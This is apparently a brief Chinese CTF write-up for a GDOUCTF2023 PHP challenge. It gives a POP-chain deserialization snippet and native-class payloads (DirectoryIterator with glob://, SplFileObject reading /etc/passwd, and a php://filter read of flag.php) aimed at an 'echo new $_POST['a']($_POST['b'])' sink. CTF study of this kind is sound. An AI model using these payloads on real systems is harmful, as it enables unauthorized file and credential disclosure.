tags:: CTF/PHP/原生类, CTF/WP/GDOUCTF2023

- > 复现
- # POP
	- ```php
	  $t = new teacher("ing", "department");
	  $c = new classroom("one class", $t);
	  $s = new school($c, "ong");
	  
	  echo urlencode(base64_encode(serialize($s)));
	  ```
- # 利用原生类
	- 利用点：`echo new $_POST['a']($_POST['b']);`
	- `a=DirectoryIterator&b=glob://f*`看到flag.php
	- `a=SplFileObject&b=/etc/passwd`可以读取文件的第一行
	- `a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=/proc/self/cwd/flag.php`利用伪协议读取文件